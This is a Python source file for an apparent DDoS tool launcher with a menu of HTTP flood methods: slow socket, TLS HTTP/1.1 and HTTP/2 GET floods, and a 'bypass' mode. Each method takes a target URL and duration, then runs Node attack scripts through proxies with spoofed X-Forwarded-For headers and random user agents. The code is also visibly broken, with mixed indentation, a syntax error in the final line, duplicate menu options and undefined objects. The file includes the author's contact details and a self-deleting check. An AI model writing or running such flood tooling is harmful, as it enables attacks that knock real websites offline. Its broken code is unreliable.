from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
try: 
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET


class Home:
	def __init__(self,
	help,
	contact):
		self.help = help
		self.contact = contact

	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): 
		print(f"""{Color.LR}

 ▄▄▄     ▄▄▄█████▓ █    ██    ▓█████▄ ▓█████▄  ▒█████    ██████     ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
▒████▄   ▓  ██▒ ▓▒ ██  ▓██▒   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒██  ▀█▄ ▒ ▓██░ ▒░▓██  ▒██░   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░██▄▄▄▄██░ ▓██▓ ░ ▓▓█  ░██░   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
 ▓█   ▓██▒ ▒██▒ ░ ▒▒█████▓    ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒    ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
 ▒▒   ▓▒█░ ▒ ░░   ░▒▓▒ ▒ ▒     ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░    ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
  ▒   ▒▒ ░   ░    ░░▒░ ░ ░     ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
  ░   ▒    ░       ░░░ ░ ░     ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░       ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░ 
      ░  ░           ░           ░       ░        ░ ░        ░           ░  ░                       ░  ░░ ░      ░  ░                                 ░       ░                                                                ░               
Dev nganhtu 🤍               
██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗    ██████╗ ██████╗  ██████╗ ███████╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝    ██║  ██║██║  ██║██║   ██║███████╗
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝     ██║  ██║██║  ██║██║   ██║╚════██║
███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║      ██████╔╝██████╔╝╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
""")
        print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1.1 socket flood (JS)")
        print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET flood (JS)")
        print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET flood (JS)")
        print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
        print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
        print("\n")
        while True:
            sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Atucuti"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
            option = input()
            if option in ['01', '1']:
                try:
                    url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
                    floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
                    reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
                    F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
                    print(Color.LG+f"\n [!] Attack sent successfully!\n")
                except:
                    print(f"{Color.LR}ERROR: {Color.RESET}Try again")
            elif option in ['02', '2']:
                try:
                    url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
                    floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
                    F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
                    print(Color.LG+f"\n [!] Attack sent successfully!\n")
                except:
                    print(f"{Color.LR}ERROR: {Color.RESET}Try again")
            elif option in ['02', '3']:
                try:
                    url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
                    floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
                    F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
                    print(Color.LG+f"\n [!] Attack sent successfully!\n")
                except:
                    print(f"{Color.LR}ERROR: {Color.RESET}Try again")
            elif option in ['04', '4']:
                try:
                    url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
                    floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
                    F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
                    print(Color.LG+f"\n [!] Attack sent successfully!\n")
                except:
                    print(f"{Color.LR}ERROR: {Color.RESET}Try again")
            elif option in ['ref', 'REF']:
                self.l7()
            elif option in ['home', 'HOME']:
                F_Tool.home()
            elif option in ['clear', 'CLEAR']:
                os.system('clear')
                self.l7()
            elif option in ['help', 'HELP', '?']:
                print(self.help)
            elif option in ['dev', 'DEV']:
                print(self.dev)
            elif option in ['exit', 'EXIT']:
                subprocess.run(['pkill -f NAT.py'], shell=True)
            elif option in ['stop', 'STOP']:
                subprocess.run(['pkill screen'], shell=True)
                print(f"{Color.LG} [!] Attack Stopped!")
            elif option in ['00', '0']:
                os.system('clear');self.bbos()
            elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
                os.system('clear');Tool.bbos()
            elif option == "":
                pass
            else:
                print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

def soon():
    pass

def spoof_useragents():
    spoof_ip = []
    ip = []
    ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
    ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

    IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
    spoof_ip.append(IP)

    useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
    'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
    'Chrome/34.0.1847.116 Safari/537.36',
    'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01']

    return {
    'Connection': 'Keep-Alive',
    'Cache-control': 'no-cache',
    'User-Agent': random.choice(useragents).strip(),
    'X-Forwarded-For': random.choice(spoof_ip)
    }

def main():
    #  checking if you're gay 👍
    F_Tool.styleText("[+] Checking Dependencies...\n\n")
    pkgs = ['screen', 'node']
    install = True
    for pkg in pkgs:
        ur_mom = which(pkg)
        if ur_mom == None:
            F_Tool.styleText(f"[!] {pkg} is not installed!\n")
            install = False
        else:
            pass
    if install == False:
        sys.exit(f'\n[?] Error? try:{Color.LG} sh setup.sh')
    else:pass
    try:
        script = True
        with open('utils') as important:pass
    except IsADirectoryError:pass
    except FileNotFoundError:
        print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
        print("\n[+] Please download on GitHub, or git clone: https://github.com/ngdangtr/F-Tool\n")
        os.remove(f'{__file__}')
        script = False
    if script == False:sys.exit()
    else:NAT.home()


if __name__ == '__main__':
    commands = f"""{Color.LC}HOME{Color.LR} ~>{Color.LY}Back to home
{Color.LC}REF{Color.LR} ~> {Color.LY}Refresh the menu
{Color.LC}CLEAR{Color.LR} ~> {Color.LY}Clear your face xd
{Color.LC}EXIT{Color.LR} ~> {Color.LY}Exit the program
{Color.LC}BBOS{Color.LR} ~> {Color.LY}L4/L7 DDOS Attack
{Color.LC}STOP{Color.LR} ~> {Color.LY}Stop your Attack
{Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/dev Fb https://www.facebook.com/17th10xxx"""
    dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/atucutis1
{Color.LC}Momo{Color.LR}: {Color.LY}0564682944"""
    NAT = Home(commands, dev)
    Tool = Tool(commands, dev, spoof_useragents())
    try:open(NAT.py');main()
    except:quit()
